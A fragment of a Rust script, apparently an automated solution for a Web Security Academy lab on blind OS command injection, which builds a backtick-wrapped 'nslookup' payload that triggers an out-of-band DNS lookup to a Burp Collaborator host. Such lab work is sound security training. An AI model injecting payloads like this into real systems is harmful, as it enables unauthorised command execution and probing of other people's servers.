...
const LAB_URL: &str = "https://0ae400ba03785f428179a8b7006e005c.web-security-academy.net";
...
fn main() {
    ...
    let payload = format!("`nslookup {BURP_COLLABORATOR}`");

    println!("{}", "OK".green());
    print!("⦗3⦘ Injecting payload to issue a DNS lookup to burp collaborator.. ");
    flush_terminal();
